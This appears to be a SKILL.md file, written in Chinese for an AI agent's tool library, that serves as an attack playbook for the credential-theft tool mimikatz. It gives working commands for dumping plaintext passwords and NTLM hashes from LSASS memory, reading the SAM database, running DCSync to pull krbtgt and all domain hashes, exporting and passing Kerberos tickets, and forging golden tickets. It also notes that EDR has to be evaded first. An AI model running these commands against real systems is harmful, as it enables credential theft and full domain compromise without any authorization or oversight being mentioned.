---
name: mimikatz-credentials
description: 渗透工具 skill:mimikatz 的安装、参数速查与攻击场景 playbook。当任务涉及 内存转储与LSASS窃取 需要调用 mimikatz 时使用。
when-to-use: 渗透工具 skill:mimikatz 的安装、参数速查与攻击场景 playbook。当任务涉及 内存转储与LSASS窃取 需要调用 mimikatz 时使用。
---

# mimikatz

- 攻击大类:C24 内存转储与LSASS窃取
- 上游仓库:https://github.com/gentilkiwi/mimikatz
- 上游 License:CC BY 4.0(署名)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
release 下载 mimikatz.exe 或 chocolatey install mimikatz
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `privilege::debug` | 提升调试权限 |
| `sekurlsa::logonpasswords` | 内存抓明文/NTLM |
| `lsadump::sam` | 本地 SAM 数据库 |
| `lsadump::dcsync /user:corp\krbtgt` | DCSync 拉 krbtgt |
| `sekurlsa::tickets /export` | 导出票据 |
| `kerberos::ptt ticket.kirbi` | 见上游文档 |
| `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-x /krbtgt:<hash>` | 见上游文档 |

## 攻击场景 Playbook

### 单机提权后收割会话凭证

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# 复制 NTLM 哈希用于 pth 或 cracking
```

### DCSync 全域哈希

```bash
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

## 注意事项

Windows 端必备;LSA Protection/ Credential Guard 环境改用 sekurlsa::dpapi 或转储 DPAPI masterkey。任何 EDR 环境都会拦截,需先落地规避。
